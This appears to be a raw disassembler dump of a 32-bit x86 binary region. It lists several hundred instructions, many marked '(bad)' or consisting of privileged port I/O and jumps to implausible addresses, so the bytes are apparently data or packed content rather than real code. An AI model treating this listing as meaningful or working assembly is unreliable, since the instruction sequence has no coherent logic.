  40c1db:	add    BYTE PTR ds:0x5ccd9b29,0x6d
  40c1e2:	sub    DWORD PTR [ebx*1+0x383e15bb],ebx
  40c1e9:	pushf  
  40c1ea:	je     0x40c247
  40c1ec:	xchg   edx,eax
  40c1ed:	daa    
  40c1ee:	aad    0x2f
  40c1f0:	stos   DWORD PTR es:[edi],eax
  40c1f1:	dec    edi
  40c1f2:	jnp    0x40c26f
  40c1f4:	sub    eax,0xb409b989
  40c1f9:	and    cl,dh
  40c1fb:	inc    esi
  40c1fc:	not    DWORD PTR [edx+0x1d2dc43e]
  40c202:	out    0xf4,eax
  40c204:	(bad)  
  40c205:	dec    ebp
  40c206:	out    dx,al
  40c207:	aam    0xff
  40c209:	or     bh,dl
  40c20b:	jne    0x40c215
  40c20d:	out    dx,al
  40c20e:	stc    
  40c20f:	jno    0x40c212
  40c211:	push   ebp
  40c212:	add    al,0xbb
  40c214:	sbb    DWORD PTR [ebx+esi*4],edx
  40c217:	ror    DWORD PTR [ecx],cl
  40c219:	sbb    al,0xfb
  40c21b:	inc    ebx
  40c21c:	pop    ebp
  40c21d:	add    al,0x62
  40c21f:	mov    ebx,DWORD PTR [eax]
  40c221:	or     ax,0x6cf0
  40c225:	and    ecx,DWORD PTR [edi-0x2d3b549f]
  40c22b:	inc    esi
  40c22c:	pop    ss
  40c22d:	mov    al,ds:0x505e02ce
  40c232:	(bad)  
  40c233:	stc    
  40c234:	aad    0x84
  40c236:	stc    
  40c237:	fxch   st(0)
  40c239:	mov    ch,0x12
  40c23b:	pop    edi
  40c23c:	outs   dx,BYTE PTR ds:[esi]
  40c23d:	cmp    bl,BYTE PTR [eax-0xd61241a]
  40c243:	adc    al,0x52
  40c245:	iret   
  40c246:	call   0x54c95c83
  40c24b:	or     al,0xb5
  40c24d:	sbb    eax,0x3e213c23
  40c252:	stc    
  40c253:	or     al,dh
  40c255:	xchg   ecx,eax
  40c256:	scas   al,BYTE PTR es:[edi]
  40c257:	aad    0x6a
  40c259:	in     al,dx
  40c25a:	xor    al,0xcf
  40c25c:	in     eax,dx
  40c25d:	shl    DWORD PTR [eax-0x796d40e9],cl
  40c263:	cwde   
  40c264:	pop    eax
  40c265:	sbb    BYTE PTR [eax],0xe3
  40c268:	inc    ebx
  40c269:	pop    es
  40c26a:	or     BYTE PTR [edi],dh
  40c26c:	inc    esi
  40c26d:	add    edx,DWORD PTR [edx+0x78]
  40c270:	dec    eax
  40c271:	loop   0x40c291
  40c273:	and    BYTE PTR [ebx+esi*1-0x4c],bh
  40c277:	mov    ecx,0xecaafb5e
  40c27c:	jns    0x40c27a
  40c27e:	in     al,dx
  40c27f:	dec    esi
  40c280:	ret    0x502
  40c283:	add    eax,0x8cb9d4bd
  40c288:	mov    ds:0xb0ec94eb,al
  40c28d:	sub    eax,0x640e8aa2
  40c292:	out    0x1a,al
  40c294:	fisub  DWORD PTR [ecx+0x50e6b18a]
  40c29a:	pop    es
  40c29b:	or     dl,BYTE PTR [eax-0x45]
  40c29e:	fiadd  WORD PTR [eax+0x7f]
  40c2a1:	sti    
  40c2a2:	push   0x616ff1a0
  40c2a7:	xchg   edx,eax
  40c2a8:	das    
  40c2a9:	cmp    al,0x60
  40c2ab:	jl     0x40c27f
  40c2ad:	sbb    eax,0x97802afc
  40c2b2:	stc    
  40c2b3:	xor    ecx,DWORD PTR [esi]
  40c2b5:	push   edx
  40c2b6:	xor    eax,0xee8956cb
  40c2bb:	repz das 
  40c2bd:	mov    ds:0xdd0642d7,eax
  40c2c2:	mov    al,0xe
  40c2c4:	(bad)  
  40c2c5:	fcomp  QWORD PTR [esi+0x56da8aaa]
  40c2cb:	xchg   esi,eax
  40c2cc:	call   0xcc0c8846
  40c2d1:	and    DWORD PTR [edx],esp
  40c2d3:	popa   
  40c2d4:	out    0x73,al
  40c2d6:	sub    esp,edi
  40c2d8:	test   BYTE PTR [esi+0x4],ah
  40c2db:	rol    DWORD PTR [esi],cl
  40c2dd:	gs sti 
  40c2df:	sbb    al,0xea
  40c2e1:	pop    ss
  40c2e2:	mov    DWORD PTR [esi-0xed2745f],ebp
  40c2e8:	inc    esp
  40c2e9:	leave  
  40c2ea:	push   esp
  40c2eb:	dec    esi
  40c2ec:	cmp    al,0xc6
  40c2ee:	inc    DWORD PTR [edx]
  40c2f0:	pop    ds
  40c2f1:	addr16 cld 
  40c2f3:	cmp    al,0xcb
  40c2f5:	sub    ecx,DWORD PTR [edi]
  40c2f7:	cmp    bh,BYTE PTR [ebx]
  40c2f9:	lahf   
  40c2fa:	mov    cl,0x73
  40c2fc:	jns    0x40c2d3
  40c2fe:	ret    0xc76f
  40c301:	out    0xc7,eax
  40c303:	in     eax,0xb8
  40c305:	xor    edi,DWORD PTR [eax-0x79aee437]
  40c30b:	rcr    DWORD PTR [ecx+0x15],0x54
  40c30f:	test   ah,bl
  40c311:	lods   al,BYTE PTR ds:[esi]
  40c312:	push   esi
  40c313:	jbe    0x40c2cb
  40c315:	pusha  
  40c316:	loope  0x40c2bf
  40c318:	xchg   ebp,eax
  40c319:	dec    edi
  40c31a:	and    ecx,DWORD PTR [ebx]
  40c31c:	jge    0x40c2bf
  40c31e:	rol    DWORD PTR [edx],0xa4
  40c321:	sub    al,0x64
  40c323:	sub    BYTE PTR [edi],dl
  40c325:	mov    ds:0x3c9a9696,eax
  40c32a:	pop    edx
  40c32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c32c:	cmp    DWORD PTR [edx],edi
  40c32e:	clc    
  40c32f:	xchg   ebx,eax
  40c330:	sbb    DWORD PTR [edi-0x1f],ebx
  40c333:	scas   eax,DWORD PTR es:[edi]
  40c334:	aam    0xaf
  40c336:	iret   
  40c337:	ins    DWORD PTR es:[edi],dx
  40c338:	test   BYTE PTR [esp+edi*2],bl
  40c33b:	cwde   
  40c33c:	nop
  40c33d:	imul   edx,eax,0x55fc0ed3
  40c343:	lds    edx,FWORD PTR [edi+eax*8]
  40c346:	rcr    bh,1
  40c348:	sub    eax,ebp
  40c34a:	mov    dh,0xf9
  40c34c:	lods   al,BYTE PTR ds:[esi]
  40c34d:	push   ebp
  40c34e:	ds or  eax,0xc02d60cf
  40c354:	js     0x40c2dd
  40c356:	ins    BYTE PTR es:[edi],dx
  40c357:	sbb    eax,DWORD PTR [ecx+0x34c97126]
  40c35d:	gs jae 0x40c39a
  40c360:	cmp    al,0xfd
  40c362:	cli    
  40c363:	(bad)  
  40c364:	aam    0x48
  40c366:	and    DWORD PTR [esi-0x66e6e509],0xebd6e59a
  40c370:	xchg   BYTE PTR [esi-0x54135a23],dh
  40c376:	shrd   DWORD PTR ds:0xd102ffa3,ecx,0xc0
  40c37e:	fwait
  40c37f:	jl     0x40c308
  40c381:	add    BYTE PTR [ebx+0x47],ch
  40c384:	stc    
  40c385:	ret    0x819f
  40c388:	ins    BYTE PTR es:[di],dx
  40c38a:	mov    ds:0x1127aa89,al
  40c38f:	add    DWORD PTR [ebp+0x2560410e],0xb1472889
  40c399:	cmc    
  40c39a:	fmul   DWORD PTR [ecx+0x53d9a4af]
  40c3a0:	sahf   
  40c3a1:	dec    ebp
  40c3a2:	push   0x723319ca
  40c3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a8:	xchg   ebx,eax
  40c3a9:	xor    BYTE PTR [eax-0x6eee6998],bl
  40c3af:	or     ch,BYTE PTR [esi]
  40c3b1:	cmp    eax,0xe8d528ea
  40c3b6:	dec    edi
  40c3b7:	jmp    0xd5d83362
  40c3bc:	mov    ebp,ebx
  40c3be:	nop
  40c3bf:	in     eax,0xb1
  40c3c1:	mov    ecx,0x9be77a16
  40c3c6:	bound  edi,QWORD PTR [edi-0x6c67557b]
  40c3cc:	ret    0x1ca1
  40c3cf:	imul   BYTE PTR [esi]
  40c3d1:	daa    
  40c3d2:	xor    eax,0x180c5048
  40c3d7:	movsx  edx,WORD PTR [ebx+0x1c]
  40c3db:	out    dx,eax
  40c3dc:	scas   al,BYTE PTR es:[edi]
  40c3dd:	cld    
  40c3de:	cdq    
  40c3df:	mov    esp,DWORD PTR [edi+0x4ca8cdb]
  40c3e5:	mov    esp,0x7bf911b6
  40c3ea:	sub    esp,ebp
  40c3ec:	popf   
  40c3ed:	jo     0x40c3bb
  40c3ef:	and    DWORD PTR [edi+esi*4-0x30],0x4c918567
  40c3f7:	loope  0x40c37e
  40c3f9:	jb     0x40c43e
  40c3fb:	jne    0x40c3f9
  40c3fd:	sbb    al,0x5a
  40c3ff:	std    
  40c400:	repz fdivr DWORD PTR [eax+eiz*2]
  40c404:	icebp  
  40c405:	dec    eax
  40c406:	jo     0x40c3b6
  40c408:	push   0xffffff84
  40c40a:	jo     0x40c408
  40c40c:	in     eax,0x76
  40c40e:	cmp    al,0xaf
  40c410:	cmp    al,BYTE PTR gs:[edx-0x3d]
  40c414:	pop    edx
  40c415:	fdivr  DWORD PTR ds:0x5238ae26
  40c41b:	lock cwde 
  40c41d:	stos   BYTE PTR es:[edi],al
  40c41e:	mov    ecx,0x6084989c
  40c423:	outs   dx,DWORD PTR ds:[esi]
  40c424:	js     0x40c3bc
  40c426:	dec    edx
  40c427:	je     0x40c408
  40c429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42a:	dec    edi
  40c42b:	mov    BYTE PTR [esi-0x71f09101],0x59
  40c432:	push   esp
  40c433:	push   0x6de0a1f7
  40c438:	pop    esi
  40c439:	(bad)  
  40c43a:	adc    ch,BYTE PTR [ecx-0x54e7642d]
  40c440:	pop    eax
  40c441:	or     eax,0xc62dc95d
  40c446:	psrlw  mm7,QWORD PTR ds:0xeb886090
  40c44d:	(bad)  
  40c44e:	mov    ds:0xe2adb1f7,al
  40c453:	jmp    0x14cc1375
  40c458:	mov    edi,0x8ab2f4f
  40c45d:	pop    eax
  40c45e:	lock shl ebx,cl
  40c461:	mov    esi,0xa7d92f03
  40c466:	push   cs
  40c467:	out    dx,eax
  40c468:	adc    BYTE PTR [ebp-0x1e4fa5ff],0x79
  40c46f:	sbb    BYTE PTR [edx+0x4bd62966],bh
  40c475:	jo     0x40c4e3
  40c477:	jmp    0xac83095e
  40c47c:	clc    
  40c47d:	xor    eax,0x5fc7ac5c
  40c482:	(bad)  
  40c483:	out    dx,al
  40c484:	mov    eax,0x2cd4edd3
  40c489:	add    DWORD PTR [edi-0x5e],esi
  40c48c:	repnz out dx,al
  40c48e:	mov    gs,WORD PTR [edx]
  40c490:	je     0x40c472
  40c492:	cmp    eax,0x7dd94630
  40c497:	or     al,BYTE PTR [eax+0x35]
  40c49a:	pop    edx
  40c49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c49c:	or     DWORD PTR [ebp+0x73],0x20
  40c4a0:	inc    ecx
  40c4a1:	lock ins BYTE PTR es:[edi],dx
  40c4a3:	xor    eax,0xf78c03f5
  40c4a8:	idiv   BYTE PTR [ebx+0x83a9aa3]
  40c4ae:	xor    ebx,DWORD PTR [ecx]
  40c4b0:	add    BYTE PTR [edx-0xb],ch
  40c4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4b4:	mov    bh,0xeb
  40c4b6:	adc    al,cl
  40c4b8:	(bad)  
  40c4b9:	rcl    DWORD PTR [eax-0x12],1
  40c4bc:	das    
  40c4bd:	rcr    ebp,1
  40c4bf:	or     edx,DWORD PTR [eax]
  40c4c1:	cmp    al,0x31
  40c4c3:	mov    eax,0x2fe263c
  40c4c8:	das    
  40c4c9:	jno    0x40c465
  40c4cb:	add    eax,0xc3b6e7a2
  40c4d0:	jmp    0xbda19235
  40c4d5:	inc    ebx
  40c4d6:	mov    esp,0x5dd9f9a0
  40c4db:	mov    eax,0xfe20c032
  40c4e0:	stos   DWORD PTR es:[edi],eax
  40c4e1:	(bad)  
  40c4e2:	cdq    
  40c4e3:	mov    ecx,0x55bb41e8
  40c4e8:	xor    al,0xce
  40c4ea:	mov    dh,0x3b
  40c4ec:	sbb    ah,BYTE PTR [ebx+0x7e]
  40c4ef:	es hlt 
  40c4f1:	test   BYTE PTR [ebx],dl
  40c4f3:	int3   
  40c4f4:	mov    edx,0xb8f386c
  40c4f9:	cmp    DWORD PTR [eax],eax
  40c4fb:	out    dx,al
  40c4fc:	xchg   DWORD PTR [ecx],edx
  40c4fe:	push   esi
  40c4ff:	bound  ebx,QWORD PTR [eax]
  40c501:	mov    cl,BYTE PTR [edi+eiz*4+0xdcee68b]
  40c508:	mov    bl,0x5c
  40c50a:	pop    edx
  40c50b:	es inc esi
  40c50d:	mov    dh,0x11
  40c50f:	xchg   DWORD PTR [ebx-0x44],ebp
  40c512:	(bad)  
  40c513:	mov    ebp,0x2a84d34f
  40c518:	and    dh,al
  40c51a:	mov    ah,0x18
  40c51c:	lock into 
  40c51e:	mov    ah,0x9c
  40c520:	dec    esp
  40c521:	imul   edi,DWORD PTR [eax+ecx*2-0x6c],0x877bcc47
  40c529:	push   es
  40c52a:	mov    ds,WORD PTR [eax-0x1af57a7f]
  40c530:	dec    ebx
  40c531:	and    al,0x72
  40c533:	dec    esp
  40c534:	mov    ebp,DWORD PTR [ecx-0x9e6941f]
  40c53a:	arpl   WORD PTR [edx],bx
  40c53c:	inc    ecx
  40c53d:	daa    
  40c53e:	aam    0x3b
  40c540:	or     bl,al
  40c542:	cmp    al,0xef
  40c544:	call   0xddbf:0xdd1938f7
  40c54b:	inc    ecx
  40c54c:	aam    0xfe
  40c54e:	sti    
  40c54f:	jae    0x40c583
  40c551:	sbb    ebp,DWORD PTR [esi]
  40c553:	mov    ?,WORD PTR [eax-0x3fd3b098]
  40c559:	sbb    edi,eax
  40c55b:	sbb    dh,cl
  40c55d:	or     BYTE PTR [edi],bh
  40c55f:	add    DWORD PTR [edx+0x6e101bfb],0x52019c9c
  40c569:	inc    esp
  40c56a:	fidivr WORD PTR [edx-0x62]
  40c56d:	(bad)  
  40c56e:	cmp    ecx,ebp
  40c570:	jl     0x40c51f
  40c572:	xchg   dh,cl
  40c574:	sar    DWORD PTR [ebp-0x78ae1c],0xf7
  40c57b:	and    eax,0x98b467c0
  40c580:	pop    esi
  40c581:	call   0x1a70dc70
  40c586:	data16 sub BYTE PTR [ebx+0x30a6d80b],ch
  40c58d:	cli    
  40c58e:	dec    eax
  40c58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c590:	sbb    edx,esi
  40c592:	sbb    DWORD PTR [esi-0x10],eax
  40c595:	push   ds
  40c596:	dec    ecx
  40c597:	dec    esi
  40c598:	xchg   edx,eax
  40c599:	repnz dec ecx
  40c59b:	push   ebx
  40c59c:	adc    dh,al
  40c59e:	sbb    ecx,DWORD PTR [edx+0x6787fed4]
  40c5a4:	or     al,0x1b
  40c5a6:	xchg   esi,eax
  40c5a7:	enter  0x611c,0x18
  40c5ab:	in     al,dx
  40c5ac:	aam    0x48
  40c5ae:	jmp    0x40c624
  40c5b0:	and    BYTE PTR [esi+0x2bfa2782],ah
  40c5b6:	inc    esi
  40c5b7:	pusha  
  40c5b8:	in     al,dx
  40c5b9:	inc    esi
  40c5ba:	int    0x76
  40c5bc:	sbb    al,0x74
  40c5be:	not    BYTE PTR [ebp+0x27]
  40c5c1:	(bad)  [ebx+0x18]
  40c5c4:	pop    esp
  40c5c5:	div    edx
  40c5c7:	es std 
  40c5c9:	mov    ch,BYTE PTR [ebx]
  40c5cb:	add    esp,DWORD PTR [edx]
  40c5cd:	pop    edi
  40c5ce:	popa   
  40c5cf:	cmp    edx,DWORD PTR [ebx-0x3e]
  40c5d2:	pushf  
  40c5d3:	add    al,0x34
  40c5d5:	sub    al,ch
  40c5d7:	mov    esp,0xcecef4dc
  40c5dc:	pop    esi
  40c5dd:	ins    BYTE PTR es:[edi],dx
  40c5de:	push   edx
  40c5df:	popf   
  40c5e0:	in     eax,0xee
  40c5e2:	cwde   
  40c5e3:	cmc    
  40c5e4:	sub    eax,0x67119048
  40c5e9:	aam    0x74
  40c5eb:	aam    0xc8
  40c5ed:	dec    eax
  40c5ee:	outs   dx,DWORD PTR ds:[esi]
  40c5ef:	xchg   ebp,eax
  40c5f0:	popf   
  40c5f1:	(bad)  
  40c5f2:	(bad)  
  40c5f3:	mov    ch,0x86
  40c5f5:	mov    al,0xad
  40c5f7:	mov    esi,ebx
  40c5f9:	iret   
  40c5fa:	mov    ecx,0x9ab9887a
  40c5ff:	call   0xc2ff778c
  40c604:	dec    ecx
  40c605:	into   
  40c606:	popf   
  40c607:	sbb    al,BYTE PTR [ecx]
  40c609:	gs xchg ecx,eax
  40c60b:	enter  0xe38b,0xb6
  40c60f:	jae    0x40c5f5
  40c611:	push   ebx
  40c612:	mov    cl,0x8e
  40c614:	xor    dh,bl
  40c616:	(bad)  
  40c617:	aas    
  40c618:	or     ax,0xd7a2
  40c61c:	shr    BYTE PTR [ecx],0x4a
  40c61f:	(bad)  
  40c620:	out    0x8c,al
  40c622:	enter  0x6339,0x8b
  40c626:	(bad)
  40c62a:	cdq    
  40c62b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c62c:	add    cl,ch
  40c62e:	leave  
  40c62f:	jmp    0xb76f1d0a
  40c634:	mov    WORD PTR [edx-0x5d],ss
  40c637:	or     eax,esi
  40c639:	ja     0x40c61d
  40c63b:	sbb    eax,0xb956d222
  40c640:	mov    ebx,0xbf6181f3
  40c645:	jno    0x40c6ab
  40c647:	cmp    ch,dl
  40c649:	int    0x51
  40c64b:	mov    esi,0x75d94b6d
  40c650:	push   edx
  40c651:	mov    bh,0x6
  40c653:	cmp    edx,edi
  40c655:	xchg   edi,eax
  40c656:	sar    BYTE PTR [eax-0xc9aab91],0xd3
  40c65d:	pop    ss
  40c65e:	mov    bl,0x6d
  40c660:	push   ecx
  40c661:	add    DWORD PTR [ecx],edx
  40c663:	not    ecx
  40c665:	mov    esi,0xf8753c46
  40c66a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c66b:	ss out dx,al
  40c66d:	xchg   edx,eax
  40c66e:	(bad)  
  40c66f:	mov    ah,0x61
  40c671:	mov    bl,0x73
  40c673:	xchg   esp,eax
  40c674:	in     eax,dx
  40c675:	sbb    DWORD PTR [edx+ebx*4],esi
  40c678:	(bad)  
  40c679:	retf   
  40c67a:	or     eax,ebx
  40c67c:	ds push ecx
  40c67e:	jge    0x40c6b4
  40c680:	inc    edx
  40c681:	call   0x42a3:0x5dde5941
  40c688:	mov    esi,0xa98975f9
  40c68d:	pop    ds
  40c68e:	add    ecx,DWORD PTR [eax]
  40c690:	push   ecx
  40c691:	scas   al,BYTE PTR es:[edi]
  40c692:	jp     0x40c692
  40c694:	hlt    
  40c695:	and    eax,0xb545af23
  40c69a:	push   es
  40c69b:	xlat   BYTE PTR ds:[ebx]
  40c69c:	ins    BYTE PTR es:[edi],dx
  40c69d:	inc    esi
  40c69e:	data16 loope 0x40c62b
  40c6a1:	loope  0x40c6ab
  40c6a3:	cwde   
  40c6a4:	adc    al,0xf0
  40c6a6:	dec    ebp
  40c6a7:	rol    BYTE PTR [ebx-0x76],1
  40c6aa:	inc    esp
  40c6ab:	lock rcr BYTE PTR [edx+0x419cd03d],0x48
  40c6b3:	std    
  40c6b4:	pop    ss
  40c6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6b6:	mov    ecx,0x935598e4
  40c6bb:	jbe    0x40c662
  40c6bd:	dec    ebp
  40c6be:	neg    dl
  40c6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c1:	es push es
  40c6c3:	or     BYTE PTR [edi],dh
  40c6c5:	pop    ss
  40c6c6:	push   ebp
  40c6c7:	sahf   
  40c6c8:	pop    esp
  40c6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ca:	rol    DWORD PTR [esi+0x46],cl
  40c6cd:	pusha  
  40c6ce:	lea    edx,[ebx+eax*1]
  40c6d1:	arpl   WORD PTR [ecx],dx
  40c6d3:	es retf 0xb70b
  40c6d7:	mov    ch,0x73
  40c6d9:	inc    edi
  40c6da:	push   ecx
  40c6db:	test   esp,0xf5d8b5a6
  40c6e1:	push   0xf1f22b33
  40c6e6:	mov    eax,ds:0x108d23ab
  40c6eb:	pop    es
  40c6ec:	test   ecx,edi
  40c6ee:	or     dh,BYTE PTR [ebx+0xe]
  40c6f1:	in     eax,dx
  40c6f2:	jle    0x40c73c
  40c6f4:	xor    eax,0x3d8b0de7
  40c6f9:	push   edi
  40c6fa:	sbb    al,0xc9
  40c6fc:	dec    edx
  40c6fd:	xor    BYTE PTR [ebx],bl
  40c6ff:	sub    al,0xd6
  40c701:	in     al,0xdb
  40c703:	sub    cl,BYTE PTR [edx+eax*8+0x72fc0da4]
  40c70a:	xlat   BYTE PTR ds:[ebx]
  40c70b:	mov    eax,ds:0xe922cf6c
  40c710:	repz pop esp
  40c712:	aas    
  40c713:	adc    DWORD PTR [ecx],ebx
  40c715:	sub    edi,DWORD PTR [esi-0x24]
  40c718:	push   ds
  40c719:	dec    eax
  40c71a:	add    ebp,DWORD PTR [ecx+0x3e6a47dd]
  40c720:	add    ebx,ecx
  40c722:	std    
  40c723:	dec    eax
  40c724:	jp     0x40c743
  40c726:	push   ebp
  40c727:	or     ecx,edi
  40c729:	ja     0x40c781
  40c72b:	iret   
  40c72c:	inc    ebx
  40c72d:	push   esi
  40c72e:	dec    eax
  40c72f:	add    al,0x67
  40c731:	jne    0x40c714
  40c733:	imul   ebx,DWORD PTR ds:0xed77095b,0xfffffffc
  40c73a:	in     eax,dx
  40c73b:	idiv   BYTE PTR [ebp+0x40]
  40c73e:	mov    bh,0xe7
  40c740:	add    BYTE PTR [edx+0x51],ah
  40c743:	jno    0x40c7b4
  40c745:	xchg   ebp,eax
  40c746:	add    al,0x3e
  40c748:	push   ds
  40c749:	jg     0x40c794
  40c74b:	adc    al,0x96
  40c74d:	dec    esi
  40c74e:	icebp  
  40c74f:	mov    edx,0x921e9e9d
  40c754:	xor    eax,0xe5433544
  40c759:	iret   
  40c75a:	xor    BYTE PTR [edx],ah
  40c75c:	mov    ds:0x51474680,eax
  40c761:	jne    0x40c73b
  40c763:	icebp  
  40c764:	outs   dx,BYTE PTR ds:[esi]
  40c765:	arpl   WORD PTR [edi],cx
  40c767:	sbb    BYTE PTR [edx+edx*1-0x18],cl
  40c76b:	lock mov edx,DWORD PTR ds:0xd7ae4f3f
  40c772:	outs   dx,BYTE PTR ds:[esi]
  40c773:	(bad)  
  40c774:	fstp   TBYTE PTR [edx]
  40c776:	(bad)  
  40c777:	sbb    BYTE PTR ds:0x5dab6ff7,cl
  40c77d:	idiv   BYTE PTR [eax-0x5]
  40c780:	dec    edi
  40c781:	out    dx,al
  40c782:	sub    cl,cl
  40c784:	xchg   BYTE PTR [eax+eax*1+0x5d],ah
  40c788:	neg    ah
  40c78a:	jnp    0x40c77a
  40c78c:	fdiv   st(1),st
  40c78e:	cdq    
  40c78f:	dec    edi
  40c790:	mov    ebp,0x5ed8c9a2
  40c795:	xchg   ebx,eax
  40c796:	add    al,0xd6
  40c798:	jge    0x40c788
  40c79a:	sahf   
  40c79b:	xchg   edi,eax
  40c79c:	mov    WORD PTR [eax+eiz*8+0x58],?
  40c7a0:	cwde   
  40c7a1:	mov    db6,ebx
  40c7a4:	push   ds
  40c7a5:	pop    edx
  40c7a6:	lods   eax,DWORD PTR ds:[esi]
  40c7a7:	inc    eax
  40c7a8:	mov    al,ds:0x6f29e531
  40c7ad:	aad    0x8c
  40c7af:	(bad)  
  40c7b0:	mov    ebp,0x5e399d6a
  40c7b5:	push   ds
  40c7b6:	inc    ebp
  40c7b7:	pop    ecx
  40c7b8:	inc    edi
  40c7b9:	aad    0x2f
  40c7bb:	stos   DWORD PTR es:[edi],eax
  40c7bc:	adc    BYTE PTR [eax+esi*8-0x64df0a55],al
  40c7c3:	mov    bh,0xf2
  40c7c5:	rcr    BYTE PTR [edi-0x234bee58],0xcb
  40c7cc:	and    dh,BYTE PTR [edi]
  40c7ce:	mov    eax,ds:0xc87cd2c9
  40c7d3:	ficomp DWORD PTR [eax-0x7b]
  40c7d6:	xchg   ah,cl
  40c7d8:	imul   ecx,DWORD PTR [ebp-0x54f6a1e6],0x55407158
  40c7e2:	test   al,0x4d
  40c7e4:	sti    
  40c7e5:	lahf   
  40c7e6:	popf   
  40c7e7:	cmp    dh,bl
  40c7e9:	into   
  40c7ea:	in     eax,0x30
  40c7ec:	mov    al,ds:0x53ef099f
  40c7f1:	mov    bh,0x62
  40c7f3:	sbb    eax,0xaf28771b
  40c7f8:	xchg   BYTE PTR [eax],bl
  40c7fa:	out    0xba,al
  40c7fc:	add    ebx,0xc510717a
  40c802:	popf   
  40c803:	xor    ecx,ecx
  40c805:	in     eax,dx
  40c806:	mov    al,ds:0x1b4a1628
  40c80b:	ss clc 
  40c80d:	int3   
  40c80e:	mov    dh,0x48
  40c810:	je     0x40c832
  40c812:	out    0xe9,al
  40c814:	xchg   ebp,eax
  40c815:	jl     0x40c840
  40c817:	fst    st(3)
  40c819:	je     0x40c83a
  40c81b:	jl     0x40c7d4
  40c81d:	test   eax,0x7c704622
  40c822:	ds add eax,0x944a62c2
  40c828:	mov    ecx,0x46baec6c
  40c82d:	dec    ebx
  40c82e:	pop    eax
  40c82f:	(bad)  
  40c830:	mov    ah,0x64
  40c832:	xchg   edi,eax
  40c833:	sub    BYTE PTR [esi+0x63],0xa6
  40c837:	jp     0x40c81b
  40c839:	mov    eax,DWORD PTR [edx+eax*1-0xb]
  40c83d:	lods   al,BYTE PTR ds:[esi]
  40c83e:	jns    0x40c895
  40c840:	sub    al,0x87
  40c842:	popf   
  40c843:	jle    0x40c7e5
  40c845:	nop
  40c846:	inc    esi
  40c847:	dec    ebp
  40c848:	out    dx,eax
  40c849:	xchg   edx,eax
  40c84a:	(bad)
  40c84d:	fs sahf 
  40c84f:	aad    0x50
  40c851:	jp     0x40c8b6
  40c853:	pop    ebx
  40c854:	sahf   
  40c855:	pop    edi
  40c856:	adc    ch,BYTE PTR [edx-0xda5fba8]
  40c85c:	lock or BYTE PTR [eax+0x3c206761],dl
  40c863:	xor    eax,0xfbf8dca6
  40c868:	out    dx,al
  40c869:	ins    BYTE PTR es:[edi],dx
  40c86a:	push   0x1a
  40c86c:	adc    al,0x39
  40c86e:	mov    eax,ds:0x2acf7150
  40c873:	fwait
  40c874:	shl    al,1
  40c876:	shr    DWORD PTR [ecx-0x24],1
  40c879:	data16 jle 0x40c829
  40c87c:	jno    0x54c008fb
  40c882:	data16 jbe 0x40c859
  40c885:	pop    ebp
  40c886:	push   ds
  40c887:	(bad)  
  40c888:	fimul  WORD PTR [edx-0x52346537]
  40c88e:	pop    ss
  40c88f:	cmp    ebx,DWORD PTR [ebx-0x2983c919]
  40c895:	dec    BYTE PTR [edi]
  40c897:	fxtract 
  40c899:	jl     0x40c84d
  40c89b:	in     al,dx
  40c89c:	aas    
  40c89d:	adc    al,BYTE PTR [edi-0x37]
  40c8a0:	pop    ebx
  40c8a1:	inc    ebx
  40c8a2:	ss push es
  40c8a4:	xor    al,0x80
  40c8a6:	push   0xffffffbb
  40c8a8:	and    esp,DWORD PTR [ecx-0x184c6e51]
  40c8ae:	cli    
  40c8af:	(bad)  
  40c8b0:	pop    ds
  40c8b1:	mov    ds:0x9378eb59,eax
  40c8b6:	out    dx,al
  40c8b7:	dec    edi
  40c8b8:	in     eax,dx
  40c8b9:	sar    DWORD PTR [bx+si],cl
  40c8bc:	cmp    BYTE PTR [edx+0x52],0xe6
  40c8c0:	cmp    BYTE PTR [ecx+0x1b],cl
  40c8c3:	adc    al,0x2a
  40c8c5:	enter  0x2605,0xe6
  40c8c9:	sub    al,0xc2
  40c8cb:	stc    
  40c8cc:	repnz adc DWORD PTR [ebx+edi*2+0x3b],0xb431320a
  40c8d5:	sub    BYTE PTR [ebx+ecx*2-0x2fe84ded],bh
  40c8dc:	or     BYTE PTR [ebp+0x21],dl
  40c8df:	out    dx,eax
  40c8e0:	jno    0x40c897
  40c8e2:	xor    bl,BYTE PTR [esi-0x65f5ebac]
  40c8e8:	jge    0x40c8f7
  40c8ea:	std    
  40c8eb:	ror    BYTE PTR [ecx-0x69a0c90e],0xfc
  40c8f2:	icebp  
  40c8f3:	cwde   
  40c8f4:	cmp    al,0x42
  40c8f6:	cdq    
  40c8f7:	pop    ds
  40c8f8:	or     eax,0x291be932
  40c8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8fe:	iret   
  40c8ff:	push   edx
  40c900:	pusha  
  40c901:	pop    ebx
  40c902:	dec    edx
  40c903:	push   ds
  40c904:	xchg   ebx,eax
  40c905:	(bad)  
  40c906:	mov    eax,ds:0x9e2bb3fe
  40c90b:	cmp    ch,BYTE PTR [ecx]
  40c90d:	cmp    bl,BYTE PTR ds:0x8a69e2fe
  40c913:	xor    BYTE PTR [esi],ch
  40c915:	nop
  40c916:	push   0xc7388de
  40c91b:	mov    esi,DWORD PTR [edi-0x19]
  40c91e:	sbb    al,0x7
  40c920:	adc    al,0x67
  40c922:	stos   BYTE PTR es:[edi],al
  40c923:	mov    bh,0x6b
  40c925:	cmp    ecx,DWORD PTR [ecx]
  40c927:	jg     0x40c93f
  40c929:	sub    DWORD PTR ds:0x6a215029,edx
  40c92f:	inc    esi
  40c930:	jmp    0xaf89fc9e
  40c935:	jno    0x40c932
  40c937:	xchg   esp,eax
  40c938:	enter  0xb7fb,0x25
  40c93c:	mov    ah,0x28
  40c93e:	lds    edx,FWORD PTR [edi]
  40c940:	dec    ecx
  40c941:	xchg   DWORD PTR [edi],ecx
  40c943:	add    DWORD PTR [eax+0x40bb6556],ebx
  40c949:	rcl    edi,0xba
